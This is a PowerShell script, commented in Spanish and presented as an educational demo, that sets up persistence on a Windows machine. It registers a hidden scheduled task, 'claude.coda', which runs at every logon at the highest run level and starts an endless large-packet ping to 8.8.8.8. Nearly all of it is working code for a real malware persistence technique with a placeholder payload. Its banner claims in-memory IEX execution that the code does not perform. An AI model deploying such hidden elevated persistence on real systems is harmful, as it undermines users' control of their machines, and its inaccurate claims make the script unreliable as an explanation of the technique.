<#
    =====================================================
    DEMO EDUCATIVA - CIBERSEGURIDAD
    Autor: [kobasky]
    Propósito: Demostrar cómo PowerShell puede crear
    persistencia en el sistema SIN escribir archivos
    maliciosos a disco.
    
     USO EXCLUSIVO EN MÁQUINAS DE PRUEBA PROPIAS 
    =====================================================
#>

Write-Host ""
Write-Host "[*] Iniciando demostración educativa..." -ForegroundColor Yellow
Write-Host "[*] Payload ejecutándose 100% en memoria (IEX)." -ForegroundColor Yellow
Write-Host ""

# ---- Nombre de la tarea programada ----
$TaskName = "claude.coda"

# ---- 1. Acción: ejecutar cmd con un ping pesado persistente a Google ----
# -t  = infinito
# -l 65500 = paquetes de 65 KB (tamaño máximo) → genera latencia visible
$Action = New-ScheduledTaskAction `
    -Execute "cmd.exe" `
    -Argument "/c ping -t -l 65500 8.8.8.8"

# ---- 2. Disparador: al iniciar sesión el usuario ----
$Trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME

# ---- 3. Configuración: oculta, no se detiene con batería ----
$Settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -Hidden `
    -ExecutionTimeLimit ([TimeSpan]::Zero)

# ---- 4. Principal: correr con el usuario actual ----
$Principal = New-ScheduledTaskPrincipal `
    -UserId $env:USERNAME `
    -LogonType Interactive `
    -RunLevel Highest

# ---- 5. Registrar la tarea ----
Register-ScheduledTask `
    -TaskName $TaskName `
    -Action $Action `
    -Trigger $Trigger `
    -Settings $Settings `
    -Principal $Principal `
    -Description "Demo educativa de persistencia" `
    -Force | Out-Null

Write-Host "[+] Tarea '$TaskName' creada correctamente." -ForegroundColor Red
Write-Host "[+] Persistencia activa: se ejecutará en cada inicio de sesión." -ForegroundColor Red
Write-Host "[+] Ping pesado hacia 8.8.8.8 en curso..." -ForegroundColor Red
Write-Host ""
Write-Host "[!] Abre el Administrador de Tareas y observa cmd.exe + latencia de red." -ForegroundColor Cyan
Write-Host "[!] Para limpiar la demo:" -ForegroundColor Cyan
Write-Host "    Unregister-ScheduledTask -TaskName 'claude.coda' -Confirm:`$false" -ForegroundColor Cyan
Write-Host "    taskkill /IM cmd.exe /F" -ForegroundColor Cyan
Write-Host ""
